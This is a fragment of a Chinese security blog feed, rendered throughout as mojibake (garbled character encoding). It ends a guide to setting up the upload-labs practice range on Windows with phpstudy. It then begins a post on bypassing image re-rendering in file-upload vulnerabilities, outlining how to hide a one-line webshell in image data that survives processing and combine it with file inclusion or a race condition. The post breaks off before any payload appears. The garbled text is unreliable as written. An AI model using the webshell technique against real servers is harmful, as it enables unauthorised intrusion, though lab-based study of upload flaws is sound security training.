style="zoom:50%;"><p>1.è¯¥é—®é¢˜æ˜¯ç”±äºInternetå®‰å…¨è®¾ç½®æœ‰é—®é¢˜å¯¼è‡´çš„ã€‚</p><p>2.æ‰“å¼€æ§åˆ¶é¢æ¿-&gt;Interneté€‰é¡¹</p><p>3.é€‰æ‹©å®‰å…¨&gt;è‡ªå®šä¹‰çº§åˆ«</p><p>4.æ–‡ä»¶ä¸‹è½½é€‰æ‹©å¯ç”¨ï¼Œç‚¹å‡»ç¡®è®¤å³å¯ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.53.56.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.54.38.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸä¸‹è½½æ–‡ä»¶äº†ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.55.18.png" style="zoom:50%;"><p>å°†è¿™ä¸ªmsuæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶ååŒå‡»å®‰è£…ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.55.54.png" style="zoom:50%;"><p>å®‰è£…å®Œæˆåé‡å¯è®¡ç®—æœºã€‚ç„¶åé‡æ–°å®‰è£…Vmware toolsã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.59.19.png" alt="å®‰å…¨æˆåŠŸ" style="zoom:50%;"><p>æœ€åæŒ‰ç…§è¦æ±‚é‡å¯ä¸€ä¸‹è®¡ç®—æœºã€‚</p></blockquote><h1 id="äºŒã€é¶åœºæ­å»ºï¼ˆç»¿è‰²å…å®‰è£…ç‰ˆï¼‰"><a href="#äºŒã€é¶åœºæ­å»ºï¼ˆç»¿è‰²å…å®‰è£…ç‰ˆï¼‰" class="headerlink" title="äºŒã€é¶åœºæ­å»ºï¼ˆç»¿è‰²å…å®‰è£…ç‰ˆï¼‰"></a>äºŒã€é¶åœºæ­å»ºï¼ˆç»¿è‰²å…å®‰è£…ç‰ˆï¼‰</h1><h2 id="2-1-é¡¹ç›®æ–‡ä»¶å‡†å¤‡"><a href="#2-1-é¡¹ç›®æ–‡ä»¶å‡†å¤‡" class="headerlink" title="2.1 é¡¹ç›®æ–‡ä»¶å‡†å¤‡"></a>2.1 é¡¹ç›®æ–‡ä»¶å‡†å¤‡</h2><p>ä¸‹è½½<code>upload-labs-env-win-0.1.7z</code>é¡¹ç›®æ–‡ä»¶ï¼Œç„¶åè§£å‹å¤åˆ¶åˆ°win2008ä¸­ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2008.56.04.png" style="zoom:40%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2008.55.41.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2008.57.50.png" style="zoom:50%;"><h2 id="2-2-é…ç½®æ›´æ”¹ä¸å¯åŠ¨"><a href="#2-2-é…ç½®æ›´æ”¹ä¸å¯åŠ¨" class="headerlink" title="2.2 é…ç½®æ›´æ”¹ä¸å¯åŠ¨"></a>2.2 é…ç½®æ›´æ”¹ä¸å¯åŠ¨</h2><ul><li>current_pathä¿®æ”¹</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.21.09.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.21.57.png" style="zoom:70%;"><p>ä¿®æ”¹ä¸ºå®é™…çš„é¡¹ç›®åœ°å€ã€‚</p><ul><li>æ”¹å®Œä¹‹ååŒå‡»phpstudyåˆå§‹åŒ–</li></ul><p>æŠ¥é”™ï¼š</p><p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.23.30.png" alt="æˆªå±2025-01-26 09.23.30"></p><p>æ‰§è¡Œ<code>modify_path</code>æ–‡ä»¶ä¿®æ”¹æ–‡ä»¶è·¯å¾„é…ç½®ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.25.45.png" style="zoom:50%;"><ul><li>ä¿®æ”¹å®Œä¹‹åé‡æ–°è¿è¡Œphpstudy.exe</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.30.31.png" style="zoom:50%;"><p>è¿˜æ˜¯å¤±è´¥ã€‚</p><ul><li>æ ¹æ®æç¤ºæ–°å»ºä¸€ä¸ªMySQLç›®å½•</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.31.52.png" style="zoom:50%;"><p>apacheèƒ½å¯åŠ¨ï¼Œä½†æ˜¯mysqlæ— æ³•å¯åŠ¨ã€‚ä½†æ˜¯è²Œä¼¼å·²ç»å¤Ÿç”¨äº†ï¼Œé¶åœºè²Œä¼¼ä¹Ÿæ²¡æœ‰ä½¿ç”¨mysqlã€‚</p><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.36.48.png" style="zoom:50%;"><blockquote><p>ä½†æ˜¯è¿˜æ˜¯æƒ³å°è¯•å¤„ç†ä¸€ä¸‹mysqlæ— æ³•å¯åŠ¨çš„é—®é¢˜ã€‚</p><p>çœ‹ä¸€ä¸‹åˆ›å»ºMySQLç›®å½•ä¹‹åç”Ÿæˆçš„<code>my.ini</code>çš„é…ç½®æ–‡ä»¶ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.40.29.png" style="zoom:50%;"><p>å‘ç°datadirçš„ç›®å½•æˆ‘å¹¶æ²¡æœ‰ï¼Œé‚åˆ›å»ºä¹‹ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.41.15.png" style="zoom:50%;"><p>é‡æ–°è¿è¡Œphpstudyï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p><p>å‚è€ƒä¸€ä¸‹phpstudyçš„æ‰‹å†Œï¼Œæ²¡æ‰¾åˆ°ç›¸å…³æè¿°ã€‚</p><p>ç‚¹å‡»Mysqlç®¡ç†å™¨æ²¡ååº”ï¼Œå°è¯•ä½¿ç”¨mysqlå‘½ä»¤è¡Œä¹Ÿæ²¡æ•ˆæœã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2009.45.03.png" style="zoom:50%;"><p>å¯èƒ½è¿™ä¸ªç»¿è‰²ç¯å¢ƒå¯ä»¥æœ¬èº«å°±æ²¡æœ‰å®‰è£…mysqlã€‚</p><p>ç›®å‰å…ˆè¿™æ ·å§ï¼Œå¦‚æœæƒ³å¯åŠ¨çš„mysqlçš„è¯å¯ä»¥è‡ªè¡Œå®‰è£…mysqlæˆ–è€…ç›´æ¥ä¸è¦ç”¨ä½œè€…æä¾›çš„ç»¿è‰²ç¯å¢ƒï¼Œè‡ªå·±ä¸‹è½½phpstudyå®‰è£…å³å¯ã€‚</p></blockquote><h1 id="ä¸‰ã€é¶åœºæ­å»ºï¼ˆæºä»£ç -phpstudyï¼‰"><a href="#ä¸‰ã€é¶åœºæ­å»ºï¼ˆæºä»£ç -phpstudyï¼‰" class="headerlink" title="ä¸‰ã€é¶åœºæ­å»ºï¼ˆæºä»£ç +phpstudyï¼‰"></a>ä¸‰ã€é¶åœºæ­å»ºï¼ˆæºä»£ç +phpstudyï¼‰</h1><h2 id="3-1-phpstudyå®‰è£…ä¸å¯åŠ¨"><a href="#3-1-phpstudyå®‰è£…ä¸å¯åŠ¨" class="headerlink" title="3.1 phpstudyå®‰è£…ä¸å¯åŠ¨"></a>3.1 phpstudyå®‰è£…ä¸å¯åŠ¨</h2><p>phpstudyä¸‹è½½åœ°å€ï¼š<a href="https://www.xp.cn/php-study">https://www.xp.cn/php-study</a></p><p>å‚»ç“œå¼å®‰è£…ï¼š</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2010.00.45.png" style="zoom:70%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2010.02.30.png" style="zoom:40%;"><ul><li>å¯åŠ¨mysqlå’ŒapacheæœåŠ¡ï¼š</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2010.03.29.png" style="zoom:50%;"><p>è¿™æ—¶ï¼Œè™šæ‹Ÿæœºå·²ç»æˆåŠŸè·‘èµ·æ¥äº†ä¸€ä¸ªç«™ç‚¹ï¼Œç›‘å¬80ç«¯å£ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.17.07.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.17.27.png" style="zoom:30%;"><ul><li>ç‚¹å‡»æ‰“å¼€ç½‘ç«™å¯ä»¥çœ‹åˆ°ç«™ç‚¹æ­å»ºæˆåŠŸçš„æç¤º</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.19.13.png" style="zoom:50%;"><ul><li>ç½‘ç«™ç®¡ç†é¡µé¢ï¼Œç‚¹å‡»<code>ä¿®æ”¹</code>å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„ç›¸å…³é…ç½®ï¼š</li></ul><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.18.32.png" style="zoom:50%;"><h2 id="3-2-ä¸‹è½½æºç å¹¶ä¸Šä¼ "><a href="#3-2-ä¸‹è½½æºç å¹¶ä¸Šä¼ " class="headerlink" title="3.2 ä¸‹è½½æºç å¹¶ä¸Šä¼ "></a>3.2 ä¸‹è½½æºç å¹¶ä¸Šä¼ </h2><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.16.12.png" style="zoom:50%;"><p>å°†æºç ä¸‹è½½è§£å‹ï¼Œæ”¹åä¸º<code>upload-lasb</code>æ”¾åœ¨æ ¹ç›®å½•<code>E:/phpstudy_pro/WWW</code>ç›®å½•ä¸‹ï¼š</p><p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.20.46.png" alt="æˆªå±2025-01-26 11.20.46"></p><h2 id="3-3-è®¿é—®æµ‹è¯•"><a href="#3-3-è®¿é—®æµ‹è¯•" class="headerlink" title="3.3 è®¿é—®æµ‹è¯•"></a>3.3 è®¿é—®æµ‹è¯•</h2><p>è¿™æ—¶phpçš„å¤§ç‰ˆæœ¬æ—¶7ã€‚è®¿é—®æ—¶åœ¨ç›®æ ‡ipååŠ ä¸Š<code>upload-labs</code>ç›®å½•å³å¯ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.21.54.png" style="zoom:50%;"><h2 id="3-4-PHPç‰ˆæœ¬é™çº§é—®é¢˜"><a href="#3-4-PHPç‰ˆæœ¬é™çº§é—®é¢˜" class="headerlink" title="3.4 PHPç‰ˆæœ¬é™çº§é—®é¢˜"></a>3.4 PHPç‰ˆæœ¬é™çº§é—®é¢˜</h2><p>ä½œè€…æ¨èçš„PHPç‰ˆæœ¬æ—¶5.2.17ï¼Œä½†æ˜¯ä¸‹è½½ä¸äº†ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.22.53.png" style="zoom:50%;"><p>å°è¯•åˆ‡æ¢ä¸º5.3.29ã€5.4.45ç‰ˆæœ¬ï¼Œè™½ç„¶èƒ½åˆ‡æ¢æˆåŠŸä½†æ˜¯upload-labsæ— æ³•æ­£å¸¸è§£æè¿è¡Œã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.24.09.png" style="zoom:50%;"><p>ç»è¿‡æµ‹è¯•ï¼Œä½¿ç”¨5.5.59æ—¶å¯ä»¥æ¸²æŸ“æˆåŠŸï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨phpstudy 8éƒ¨ç½²è¿™ä¸ªé¶åœºï¼Œå¯èƒ½PHPè‡³å°‘å¾—æ˜¯5.5.59ç‰ˆæœ¬æ‰å¯ä»¥ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.25.54.png" alt="ä½¿ç”¨5.5.59æ—¶å¯ä»¥æ¸²æŸ“æˆåŠŸ" style="zoom:40%;"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä¸»è¦æä¾›äº†ä¸¤ç§éƒ¨ç½²upload-labsçš„æ–¹æ³•ï¼š1ï¼‰ç»¿è‰²å…å®‰è£… 2ï¼‰phpstudy+æºç å®‰è£…ã€‚</p><p>æ— æ³•ä½¿ç”¨ä½ç‰ˆæœ¬çš„phpå¯èƒ½ä¼šå¯¼è‡´æŸäº›æ¼æ´éªŒè¯å¤±è´¥ï¼Œæ‰€ä»¥è¿˜æ˜¯å»ºè®®ä½¿ç”¨ä½œè€…æä¾›çš„ç»¿è‰²å…å®‰è£…ç‰ˆæœ¬ï¼Œé¶åœºæœ¬èº«å¹¶ä¸æ¶‰åŠæ•°æ®åº“äº¤äº’æ•°æ®åº“å¯åŠ¨ä¸èµ·æ¥æœ¬èº«å¯ä»¥å¿½ç•¥ã€‚</p><p>æƒ³è¦åˆ‡æ¢ç»¿è‰²ç‰ˆæœ¬ï¼Œåªéœ€è¦æŠŠæ–°å®‰è£…çš„phpstudyçš„æœåŠ¡éƒ½åœæ­¢ï¼Œç„¶åè¿è¡Œç»¿è‰²å…å®‰è£…ç‰ˆæœ¬çš„phpstudyå³å¯ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.37.38.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.38.40.png" alt="æˆªå±2025-01-26 11.38.40" style="zoom:40%;"><p>Endï¼</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¹‹äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</title>
      <link href="/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/"/>
      <url>/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“"></a>ä¸€ã€ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“</h1><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´é¢†åŸŸï¼Œ<strong>äºŒæ¬¡æ¸²æŸ“</strong>æ˜¯æŒ‡æœåŠ¡å™¨åœ¨æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œå†æ¬¡å¤„ç†æˆ–ä¿®æ”¹çš„è¿‡ç¨‹ã€‚è¿™ç§å¤„ç†é€šå¸¸ç”¨äºä¼˜åŒ–æ–‡ä»¶å¤§å°ã€æ ¼å¼åŒ–æ–‡ä»¶å†…å®¹æˆ–è¿›è¡Œå®‰å…¨æ£€æŸ¥ã€‚</p><p>åœ¨PHPä¸­äºŒæ¬¡æ¸²æŸ“æ‰€æ¶‰åŠçš„å‡½æ•°åŒ…æ‹¬imagecreatefromjpegï¼Œimagecreatefromgifå’Œimagecreatefrompngï¼Œç”¨äºä»ä¸åŒæ ¼å¼çš„å›¾åƒæ–‡ä»¶åˆ›å»ºå›¾åƒèµ„æºçš„å‡½æ•°ï¼Œå®ƒä»¬çš„åŸç†å’Œå·¥ä½œæ–¹å¼åŸºäº PHP çš„ GD åº“ã€‚</p><p>è¿™äº›å‡½æ•°çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯å°†å›¾åƒæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªå›¾åƒèµ„æºï¼ˆ<code>resource</code>ï¼‰ï¼Œä»¥ä¾¿åç»­è¿›è¡Œå›¾åƒå¤„ç†æ“ä½œã€‚å®ƒä»¬çš„å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li><strong>æ–‡ä»¶è¯»å–</strong>ï¼šå‡½æ•°é¦–å…ˆæ‰“å¼€æŒ‡å®šçš„å›¾åƒæ–‡ä»¶æˆ– URLï¼Œè¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚</li><li><strong>æ ¼å¼è§£æ</strong>ï¼šæ ¹æ®æ–‡ä»¶çš„æ ¼å¼ï¼ˆJPEGã€GIF æˆ– PNGï¼‰ï¼Œå‡½æ•°è§£ææ–‡ä»¶çš„ç»“æ„å’Œæ•°æ®ã€‚ä¾‹å¦‚ï¼ŒJPEG æ–‡ä»¶ä½¿ç”¨ DCTï¼ˆç¦»æ•£ä½™å¼¦å˜æ¢ï¼‰è¿›è¡Œå‹ç¼©ï¼Œè€Œ PNG æ–‡ä»¶ä½¿ç”¨æ— æŸå‹ç¼©ç®—æ³•ã€‚</li><li><strong>åˆ›å»ºå›¾åƒèµ„æº</strong>ï¼šè§£æå®Œæˆåï¼Œå‡½æ•°å°†å›¾åƒæ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¹¶è¿”å›ä¸€ä¸ªå›¾åƒèµ„æºæ ‡è¯†ç¬¦ã€‚è¿™ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­å›¾åƒæ•°æ®çš„æŒ‡é’ˆï¼Œåç»­çš„å›¾åƒå¤„ç†å‡½æ•°ï¼ˆå¦‚ <code>imagejpeg</code>ã€<code>imagepng</code> ç­‰ï¼‰å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ ‡è¯†ç¬¦æ¥æ“ä½œå›¾åƒã€‚</li></ul><p><code>imagecreatefromjpeg</code>ã€<code>imagecreatefromgif</code> å’Œ <code>imagecreatefrompng</code> è¿™äº›å‡½æ•°åœ¨åŠ è½½å›¾åƒæ–‡ä»¶æ—¶ï¼Œä¼šå¯¹å›¾åƒæ–‡ä»¶çš„å†…å®¹è¿›è¡Œè§£æå’Œæ£€æŸ¥ï¼Œä»¥ç¡®ä¿æ–‡ä»¶æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ï¼Œå¹¶æå–å¿…è¦çš„ä¿¡æ¯ä»¥ä¾¿åç»­æ“ä½œã€‚ä»¥ä¸‹æ˜¯å®ƒä»¬ä¼šæ£€æŸ¥å’Œå¤„ç†çš„å…·ä½“å†…å®¹ï¼š</p><blockquote><ol><li><strong>æ–‡ä»¶æ ¼å¼éªŒè¯</strong></li></ol><p>è¿™äº›å‡½æ•°ä¼šæ£€æŸ¥æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ï¼Œä»¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦ç¬¦åˆç›¸åº”çš„å›¾åƒæ ¼å¼è§„èŒƒï¼ˆå¦‚ JPEGã€GIF æˆ– PNGï¼‰ã€‚å…·ä½“åŒ…æ‹¬ï¼š</p><ul><li><strong>æ–‡ä»¶ç­¾åï¼ˆMagic Numberï¼‰</strong>ï¼šæ¯ä¸ªå›¾åƒæ ¼å¼éƒ½æœ‰ç‰¹å®šçš„æ–‡ä»¶ç­¾åã€‚ä¾‹å¦‚ï¼š<ul><li>JPEG æ–‡ä»¶é€šå¸¸ä»¥ <code>0xFFD8</code> å¼€å§‹ã€‚</li><li>GIF æ–‡ä»¶ä»¥ <code>GIF87a</code> æˆ– <code>GIF89a</code> å¼€å§‹ã€‚</li><li>PNG æ–‡ä»¶ä»¥ <code>0x89PNG\r\n\x1a\n</code> å¼€å§‹ã€‚</li></ul></li><li><strong>æ ¼å¼ç‰ˆæœ¬</strong>ï¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦ç¬¦åˆç‰¹å®šç‰ˆæœ¬çš„å›¾åƒæ ¼å¼è§„èŒƒã€‚</li></ul><ol start="2"><li><strong>å›¾åƒå…ƒæ•°æ®</strong></li></ol><p>è¿™äº›å‡½æ•°ä¼šè§£æå›¾åƒæ–‡ä»¶ä¸­çš„å…ƒæ•°æ®ï¼Œæå–ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><strong>å›¾åƒå°ºå¯¸</strong>ï¼šå®½åº¦å’Œé«˜åº¦ï¼ˆä»¥åƒç´ ä¸ºå•ä½ï¼‰ã€‚</li><li><strong>é¢œè‰²ä¿¡æ¯</strong>ï¼šé¢œè‰²ç±»å‹ï¼ˆå¦‚ RGBã€ç°åº¦ï¼‰ã€é¢œè‰²æ·±åº¦ï¼ˆå¦‚ 8 ä½ã€16 ä½ï¼‰ã€é¢œè‰²ç´¢å¼•è¡¨ï¼ˆå¯¹äºè°ƒè‰²æ¿å›¾åƒï¼‰ã€‚</li><li><strong>å‹ç¼©æ–¹å¼</strong>ï¼šJPEG çš„å‹ç¼©è´¨é‡ã€PNG çš„æ— æŸå‹ç¼©ç®—æ³•ç­‰ã€‚</li><li><strong>å…¶ä»–å…ƒæ•°æ®</strong>ï¼šä¾‹å¦‚ EXIF ä¿¡æ¯ï¼ˆå¯¹äº JPEG æ–‡ä»¶ï¼Œå¯èƒ½åŒ…å«æ‹æ‘„æ—¶é—´ã€ç›¸æœºå‹å·ç­‰ï¼‰ã€PNG çš„æ–‡æœ¬å—ç­‰ã€‚</li></ul><ol start="3"><li><strong>å›¾åƒæ•°æ®</strong></li></ol><p>è¿™äº›å‡½æ•°ä¼šè§£æå›¾åƒæ–‡ä»¶ä¸­çš„å®é™…å›¾åƒæ•°æ®ï¼Œæå–åƒç´ ä¿¡æ¯ï¼š</p><ul><li><strong>JPEG</strong>ï¼šè§£ç  DCTï¼ˆç¦»æ•£ä½™å¼¦å˜æ¢ï¼‰æ•°æ®ï¼Œæ¢å¤åƒç´ ä¿¡æ¯ã€‚</li><li><strong>GIF</strong>ï¼šè§£æè°ƒè‰²æ¿å’Œåƒç´ ç´¢å¼•ï¼Œæ”¯æŒåŠ¨ç”»å¸§ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</li><li><strong>PNG</strong>ï¼šè§£ç æ— æŸå‹ç¼©æ•°æ®ï¼Œæ”¯æŒé€æ˜åº¦ï¼ˆalpha é€šé“ï¼‰ã€‚</li></ul><ol start="4"><li><strong>é”™è¯¯å¤„ç†</strong></li></ol><p>å¦‚æœæ–‡ä»¶æ ¼å¼ä¸æ­£ç¡®æˆ–æ–‡ä»¶æŸåï¼Œè¿™äº›å‡½æ•°ä¼šè¿”å› <code>FALSE</code>ï¼Œå¹¶å¯èƒ½è§¦å‘é”™è¯¯æˆ–è­¦å‘Šã€‚ä¾‹å¦‚ï¼š</p><ul><li>æ–‡ä»¶ç­¾åä¸åŒ¹é…ã€‚</li><li>æ–‡ä»¶æŸåæˆ–ç¼ºå¤±å¿…è¦çš„æ•°æ®å—ã€‚</li><li>å›¾åƒå°ºå¯¸æˆ–é¢œè‰²ä¿¡æ¯æ— æ•ˆã€‚</li></ul><ol start="5"><li><strong>å†…å­˜åˆ†é…</strong></li></ol><p>è¿™äº›å‡½æ•°ä¼šæ ¹æ®å›¾åƒçš„å°ºå¯¸å’Œé¢œè‰²ä¿¡æ¯ï¼Œä¸ºå›¾åƒæ•°æ®åˆ†é…å†…å­˜ã€‚ä¾‹å¦‚ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªè¶³å¤Ÿå¤§çš„å†…å­˜ç¼“å†²åŒºæ¥å­˜å‚¨è§£ç åçš„åƒç´ æ•°æ®ã€‚</li><li>åˆå§‹åŒ–å›¾åƒèµ„æºå¯¹è±¡ï¼Œå­˜å‚¨å›¾åƒçš„å…ƒæ•°æ®å’Œåƒç´ æ•°æ®ã€‚</li></ul></blockquote><h1 id="äºŒã€getshell-æ€è·¯"><a href="#äºŒã€getshell-æ€è·¯" class="headerlink" title="äºŒã€getshell æ€è·¯"></a>äºŒã€getshell æ€è·¯</h1><h2 id="2-1-é…åˆæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#2-1-é…åˆæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="2.1 é…åˆæ–‡ä»¶åŒ…å«æ¼æ´"></a>2.1 é…åˆæ–‡ä»¶åŒ…å«æ¼æ´</h2><p>å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ç½‘ç«™äºŒæ¬¡å¤„ç†åçš„å›¾ç‰‡ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚è¿™æ ·äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­å°±å­˜åœ¨äº†ä¸€å¥è¯ï¼Œåœ¨é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è·å–webshellã€‚</p><h2 id="2-2-å¯ä»¥é…åˆæ¡ä»¶ç«äº‰"><a href="#2-2-å¯ä»¥é…åˆæ¡ä»¶ç«äº‰" class="headerlink" title="2.2 å¯ä»¥é…åˆæ¡ä»¶ç«äº‰"></a>2.2 å¯ä»¥é…åˆæ¡ä»¶ç«äº‰</h2><p> å…ˆå°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†åˆ¤æ–­ï¼Œç¬¦åˆå°±ä¿å­˜ï¼Œä¸ç¬¦åˆåˆ é™¤ï¼Œå¯åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œçˆ†ç ´ä¸Šä¼ ã€‚</p><blockquote><p>ä¸‹é¢çš„å†…å®¹ä»¥buuojä¸Šupload-labs-linux Pass-16ä¸ºä¾‹å­ï¼Œå…·ä½“è§æœ¬ç«™ã€Šweb-buuoj-(Upload-Labs-Linux)-æ–‡ä»¶ä¸Šä¼ ã€‹ä¸€æ–‡ã€‚</p></blockquote><h1 id="ä¸‰ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«gifå›¾ç‰‡æœ¨é©¬"><a href="#ä¸‰ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«gifå›¾ç‰‡æœ¨é©¬" class="headerlink" title="ä¸‰ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«gifå›¾ç‰‡æœ¨é©¬"></a>ä¸‰ã€ç»•è¿‡äºŒæ¬¡æ¸²æŸ“å¹¶åŒ…å«gifå›¾ç‰‡æœ¨é©¬</h1><h2 id="3-1-åˆ¶ä½œåŸå§‹çš„å›¾ç‰‡æœ¨é©¬"><a href="#3-1-åˆ¶ä½œåŸå§‹çš„å›¾ç‰‡æœ¨é©¬" class="headerlink" title="3.1 åˆ¶ä½œåŸå§‹çš„å›¾ç‰‡æœ¨é©¬"></a>3.1 åˆ¶ä½œåŸå§‹çš„å›¾ç‰‡æœ¨é©¬</h2><ul><li>å‡†å¤‡ä¸€ä¸ªgifå›¾åƒ</li></ul><img 